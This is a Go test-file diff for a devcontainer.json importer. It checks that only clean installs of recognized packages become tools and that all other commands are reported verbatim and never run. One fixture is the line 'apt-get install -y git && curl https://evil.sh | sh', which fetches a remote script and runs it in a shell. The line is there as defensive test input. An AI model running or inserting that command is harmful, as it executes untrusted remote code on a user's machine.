@@ -550,3 +550,107 @@ func TestImportNeverExecutesLifecycleCommands(t *testing.T) {
 		t.Errorf("Deferred = %v, want commands REPORTED not deferred", res.Deferred)
 	}
 }
+
+// importDraft is a small helper: Import the given devcontainer.json body and return
+// the parsed draft playbook + the ImportResult.
+func importDraft(t *testing.T, body string) (*playbook.Playbook, ImportResult) {
+	t.Helper()
+	res, err := Import(writeFixture(t, body))
+	if err != nil {
+		t.Fatalf("Import: %v", err)
+	}
+	pb, err := playbook.ParseFile(res.Draft)
+	if err != nil {
+		t.Fatalf("ParseFile: %v", err)
+	}
+	return pb, res
+}
+
+// TestImportMapsRecognizedInstallCommandsToTools pins the #259 commands→tools
+// declarative mapping (FR-IMPORT-006): a lifecycle command that is, in its entirety,
+// a clean install of recognized packages is lifted to tools: (deduped + sorted, union
+// with feature-derived tools) and CONSUMED from reported.commands — mirroring
+// features→tools (FR-IMPORT-004). Everything else stays in reported.commands.
+func TestImportMapsRecognizedInstallCommandsToTools(t *testing.T) {
+	pb, res := importDraft(t, `{
+  "name": "demo",
+  "features": { "ghcr.io/devcontainers/features/go:1": {} },
+  "onCreateCommand": "apt-get install -y git jq",
+  "postCreateCommand": "npm install -g prettier"
+}`)
+
+	// Union of feature-derived (go) + command-derived (git, jq, prettier), sorted.
+	want := []string{"git", "go", "jq", "prettier"}
+	if !reflect.DeepEqual(pb.Tools, want) {
+		t.Errorf("tools = %v, want %v (feature ∪ command installs)", pb.Tools, want)
+	}
+	if !reflect.DeepEqual(res.Mapped.Tools, want) {
+		t.Errorf("--json mapped.tools = %v, want %v", res.Mapped.Tools, want)
+	}
+	// Both commands were recognized installs → fully consumed; nothing reported.
+	if pb.Reported != nil && len(pb.Reported.Commands) != 0 {
+		t.Errorf("reported.commands = %+v, want empty (every command mapped)", pb.Reported.Commands)
+	}
+}
+
+// TestImportCommandMappingDeterministicBoundary is the security heart of #259: ONLY a
+// deterministically-recognizable clean install of recognized packages maps; everything
+// else stays VERBATIM in reported.commands, never executed and never split. Each case
+// asserts the command is NOT mapped to a tool and survives intact in reported.commands.
+func TestImportCommandMappingDeterministicBoundary(t *testing.T) {
+	cases := map[string]struct {
+		cmd string
+	}{
+		// The load-bearing one: a recognized install PREFIX joined to a malicious tail
+		// must NOT lift `git` and silently drop `&& curl … | sh` — the whole command is
+		// reported (ADR-0005 worst-thing test).
+		"compound install + payload": {cmd: "apt-get install -y git && curl https://evil.sh | sh"},
+		"conditional":                {cmd: "test -f x || apt-get install -y git"},
+		"piped":                      {cmd: "echo y | apt-get install git"},
+		"redirected":                 {cmd: "apt-get install -y git > /tmp/log"},
+		"command substitution":       {cmd: "apt-get install -y $(echo git)"},
+		"unrecognized package":       {cmd: "apt-get install -y totally-unknown-pkg"},
+		"recognized + unknown mix":   {cmd: "apt-get install -y git unknown-pkg"}, // all-or-nothing
+		"unknown flag":               {cmd: "apt-get install --reinstall git"},
+		"unrecognized installer":     {cmd: "brew install git"},
+		"npm local (not global)":     {cmd: "npm install prettier"},
+		"bare non-install command":   {cmd: "make build"},
+	}
+	for name, tc := range cases {
+		t.Run(name, func(t *testing.T) {
+			pb, _ := importDraft(t, fmt.Sprintf(`{"name":"demo","postCreateCommand":%q}`, tc.cmd))
+
+			if len(pb.Tools) != 0 {
+				t.Errorf("tools = %v, want NONE (command must not map)", pb.Tools)
+			}
+			if pb.Reported == nil || len(pb.Reported.Commands) != 1 {
+				t.Fatalf("reported.commands = %+v, want the command reported verbatim", pb.Reported)
+			}
+			if got := pb.Reported.Commands[0].Run; !reflect.DeepEqual(got, []string{tc.cmd}) {
+				t.Errorf("reported command = %v, want verbatim [%q]", got, tc.cmd)
+			}
+		})
+	}
+}
+
+// TestImportCommandMappingPerCommandGranularity proves the mapping is per-command, not
+// per-hook: in a hook holding several commands (object form), the recognized installs
+// are lifted to tools: while the unrecognized commands remain in that hook's reported
+// entry — no recognized install is lost, no unrecognized command is mapped.
+func TestImportCommandMappingPerCommandGranularity(t *testing.T) {
+	pb, _ := importDraft(t, `{
+  "name": "demo",
+  "postCreateCommand": { "a": "apt-get install -y jq", "b": "./project-specific-setup.sh" }
+}`)
+
+	if !reflect.DeepEqual(pb.Tools, []string{"jq"}) {
+		t.Errorf("tools = %v, want [jq] (the recognized install lifted)", pb.Tools)
+	}
+	if pb.Reported == nil || len(pb.Reported.Commands) != 1 {
+		t.Fatalf("reported.commands = %+v, want the unrecognized command kept", pb.Reported)
+	}
+	got := pb.Reported.Commands[0]
+	if got.Hook != "postCreateCommand" || !reflect.DeepEqual(got.Run, []string{"./project-specific-setup.sh"}) {
+		t.Errorf("reported entry = %+v, want only the unrecognized setup script under postCreateCommand", got)
+	}
+}
